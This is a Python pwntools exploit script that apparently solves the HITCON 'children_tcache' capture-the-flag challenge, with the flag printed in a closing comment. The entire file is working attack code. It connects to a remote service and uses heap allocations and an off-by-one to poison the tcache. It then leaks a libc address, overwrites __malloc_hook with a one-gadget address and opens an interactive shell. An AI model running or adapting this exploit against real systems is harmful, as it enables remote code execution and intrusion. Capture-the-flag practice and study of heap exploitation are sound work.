from pwn import *

#r=process("./children_tcache")
r=connect("54.178.132.125",8763)
libc=ELF("./libc.so.6")
#pause()
def alloc(size,content):
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(content)
    r.recvuntil(": ")


def free(id):
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(id))
    r.recvuntil(": ")


r.recvuntil(":")

alloc(0x450,"A"*8)#0
alloc(0x70,"B"*8)#1
alloc(0x600-0x10,"C"*8)#2
alloc(0x40,"D"*8)#3 pad

free(1) #put to tcache first
free(0)

#clean the 0xda
for i in range(9):
    alloc(0x78-i,"q"*(0x78-i))#0
    free(0)
alloc(0x78,"q"*0x70+p64(0x460+0x80))#0

free(2)

alloc(0x450,"x")#1

alloc(0x620,"freeme")#0 and #2 is point to freeme as well

free(0)
r.sendline("2")
r.recvuntil(":")
r.sendline("2")
leak= r.recvuntil("\n")
leak=(u64(leak[:-1].ljust(8,"\x00")))
print hex(leak)
r.recvuntil(": ")
libc_base = leak-(0x7f092ae27ca0-0x00007f092aa3c000)
malloc_hook = libc_base+libc.sym["__malloc_hook"]

print(hex(malloc_hook))
one=libc_base+0x4f322
print(hex(one))
alloc(0x60,"MALLOC")
#now 0 and 2 is pointed to MALLOC
free(0)
free(2)
alloc(0x60,p64(malloc_hook))
alloc(0x60,"x")
alloc(0x60,p64(one))
sleep(1)
r.sendline("1")
r.sendline("100")
sleep(2)
r.sendline("ls -al")

r.interactive()
#hitcon{l4st_rem41nd3r_1s_v3ry_us3ful}
